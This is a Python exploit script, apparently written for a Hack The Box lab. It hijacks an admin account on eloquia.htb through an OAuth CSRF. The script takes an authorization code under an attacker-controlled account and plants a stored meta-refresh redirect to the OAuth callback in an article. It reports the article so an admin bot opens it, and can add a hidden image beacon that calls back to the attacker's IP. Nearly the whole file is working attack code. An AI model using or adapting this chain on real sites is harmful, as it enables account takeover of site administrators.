#!/usr/bin/env python3
"""
04_oauth_exploit.py - OAuth CSRF attack to hijack admin account
"""

import requests
import os
import sys
import time
import random
import re
import argparse
import subprocess
from PIL import Image
from io import BytesIO

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")

TARGET_ELOQUIA = "http://eloquia.htb"
TARGET_QOOQLE = "http://qooqle.htb"

# OAuth client details (from recon)
CLIENT_ID = "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi"
REDIRECT_URI = "http://eloquia.htb/accounts/oauth2/qooqle/callback/"

def get_callback_ip():
    """Get tun0 IP for callback"""
    try:
        result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return "10.10.15.49"

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner():
    """Create a banner image >20KB"""
    img = Image.new('RGB', (200, 150))
    for i in range(200):
        for j in range(150):
            img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

def get_all_article_ids(session):
    """Get all article IDs from my articles page"""
    my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
    return set(re.findall(r'article/visit/(\d+)', my_articles.text))

def main():
    parser = argparse.ArgumentParser(description='OAuth CSRF Exploit')
    parser.add_argument('--test', action='store_true',
                        help='Test mode: redirect to capture server instead of OAuth callback')
    parser.add_argument('--beacon', action='store_true',
                        help='Add beacon img tag to confirm admin visited (use with capture server)')
    parser.add_argument('--port', type=int, default=8888,
                        help='Capture server port (default: 8888)')
    parser.add_argument('--ip', type=str, default=None,
                        help='Capture server IP (default: tun0 IP)')
    args = parser.parse_args()

    username, password = load_credentials()
    if not username:
        print("[-] No credentials. Run ./01_register_users.sh")
        sys.exit(1)

    timestamp = str(int(time.time()))
    callback_ip = args.ip or get_callback_ip()

    if args.test:
        print("╔══════════════════════════════════════════════════════════╗")
        print("║         04 - OAUTH CSRF EXPLOIT [TEST MODE]              ║")
        print("╚══════════════════════════════════════════════════════════╝")
        print(f"[*] TEST MODE: Redirecting to capture server")
        print(f"[*] Capture URL: http://{callback_ip}:{args.port}/")
    else:
        print("╔══════════════════════════════════════════════════════════╗")
        print("║         04 - OAUTH CSRF EXPLOIT                          ║")
        print("╚══════════════════════════════════════════════════════════╝")
    print(f"[*] Attacker account: {username}")
    print()

    # === Step 1: Login to Qooqle and get OAuth code ===
    print("[1/4] Logging into Qooqle...")
    qooqle_session = requests.Session()

    login_page = qooqle_session.get(f"{TARGET_QOOQLE}/login/")
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', login_page.text).group(1)

    resp = qooqle_session.post(f"{TARGET_QOOQLE}/login/", data={
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password
    }, headers={'Referer': f"{TARGET_QOOQLE}/login/"})

    if 'sessionid' not in qooqle_session.cookies:
        print("[-] Qooqle login failed!")
        sys.exit(1)
    print(f"    Logged in as {username}")

    # === Step 2: Generate OAuth authorization code ===
    print("[2/4] Generating OAuth code...")

    auth_url = f"{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}"
    auth_page = qooqle_session.get(auth_url)
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', auth_page.text).group(1)

    # Authorize - don't follow redirect to capture the code
    resp = qooqle_session.post(auth_url, data={
        'csrfmiddlewaretoken': csrf,
        'redirect_uri': REDIRECT_URI,
        'scope': 'read write',
        'client_id': CLIENT_ID,
        'response_type': 'code',
        'allow': 'Authorize'
    }, headers={'Referer': auth_url}, allow_redirects=False)

    # Extract code from redirect Location header
    location = resp.headers.get('Location', '')
    code_match = re.search(r'code=([^&\s]+)', location)

    if not code_match:
        print("[-] Failed to get OAuth code")
        print(f"    Location: {location}")
        sys.exit(1)

    oauth_code = code_match.group(1)
    print(f"    OAuth code: {oauth_code}")

    # The malicious callback URL
    malicious_url = f"{REDIRECT_URI}?code={oauth_code}"
    print(f"    Callback URL: {malicious_url}")

    # === Step 3: Login to Eloquia and create poisoned article ===
    print("[3/4] Creating poisoned article on Eloquia...")

    eloquia_session = requests.Session()

    login_page = eloquia_session.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', login_page.text).group(1)

    resp = eloquia_session.post(f"{TARGET_ELOQUIA}/accounts/login/", data={
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'password': password
    }, headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"})

    if 'sessionid' not in eloquia_session.cookies:
        print("[-] Eloquia login failed!")
        sys.exit(1)

    # Get existing article IDs BEFORE creating new one
    existing_ids = get_all_article_ids(eloquia_session)
    print(f"    Existing articles: {existing_ids}")

    # Get article create form
    create_page = eloquia_session.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', create_page.text).group(1)

    # Create article with meta refresh
    banner = create_banner()
    title = f"Security Update {timestamp}"

    # Optional beacon to confirm admin visited
    beacon_tag = ""
    if args.beacon:
        beacon_url = f"http://{callback_ip}:{args.port}/beacon?ts={timestamp}&mode={'test' if args.test else 'real'}"
        beacon_tag = f'<img src="{beacon_url}" style="display:none">'
        print(f"    Beacon URL: {beacon_url}")

    # Use 1 second delay if beacon enabled (gives img time to load), else instant
    refresh_delay = "1" if args.beacon else "0"

    if args.test:
        # Test mode: redirect to capture server
        test_url = f"http://{callback_ip}:{args.port}/oauth_test?ts={timestamp}&code={oauth_code[:8]}"
        content = f'{beacon_tag}<meta http-equiv="refresh" content="{refresh_delay};url={test_url}"><p>Test article.</p>'
        print(f"    Test redirect URL: {test_url}")
    else:
        # Real exploit: redirect to OAuth callback
        content = f'{beacon_tag}<meta http-equiv="refresh" content="{refresh_delay};url={malicious_url}"><p>Important security update.</p>'

    resp = eloquia_session.post(f"{TARGET_ELOQUIA}/article/create/",
        data={
            'csrfmiddlewaretoken': csrf,
            'title': title,
            'content': content
        },
        files={'banner': ('banner.png', banner, 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    # Get article ID from response URL or page
    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)

    # If not found, compare article lists to find the NEW one
    if not article_id:
        new_ids = get_all_article_ids(eloquia_session)
        created_ids = new_ids - existing_ids
        if created_ids:
            article_id = max(created_ids)  # Get highest (newest) ID
            print(f"    New article detected: {article_id}")

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    print(f"    Article ID: {article_id}")

    # Save exploit info to tmp folder
    with open(os.path.join(TMP_DIR, "exploit_article_id.txt"), "w") as f:
        f.write(article_id)
    with open(os.path.join(TMP_DIR, "oauth_code.txt"), "w") as f:
        f.write(oauth_code)

    # Save mapping for capture server (timestamp -> article_id)
    import json
    mapping_file = os.path.join(TMP_DIR, "test_mapping.json")
    mapping = {}
    if os.path.exists(mapping_file):
        try:
            with open(mapping_file) as f:
                mapping = json.load(f)
        except:
            pass
    mapping[timestamp] = {"article_id": article_id, "code": oauth_code[:8]}
    with open(mapping_file, "w") as f:
        json.dump(mapping, f)

    # === Step 4: Report the article ===
    print("[4/4] Reporting article to trigger admin bot...")
    eloquia_session.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
    print(f"    Article {article_id} reported!")

    print()
    print("=" * 60)
    if args.test:
        print("  TEST ARTICLE DEPLOYED!")
        print()
        print(f"  Article ID: {article_id}")
        print(f"  Timestamp: {timestamp}")
        print(f"  OAuth code prefix: {oauth_code[:8]}...")
        print()
        print("  Watch your capture server for:")
        print(f"    /oauth_test?ts={timestamp}&code={oauth_code[:8]}")
        print()
        print("  The capture server will show elapsed time from creation.")
        print("  If you see the callback, run without --test for real exploit.")
    else:
        print("  EXPLOIT DEPLOYED!")
        print()
        print(f"  Article ID: {article_id}")
        print(f"  OAuth code: {oauth_code}")
        print(f"  Saved to: {TMP_DIR}/")
        print()
        print("  When admin bot visits, their account will be linked")
        print(f"  to YOUR Qooqle account ({username}).")
        print()
        print("  Wait ~10 seconds, then run: ./05_login_as_admin.py")
    print("=" * 60)

if __name__ == "__main__":
    main()
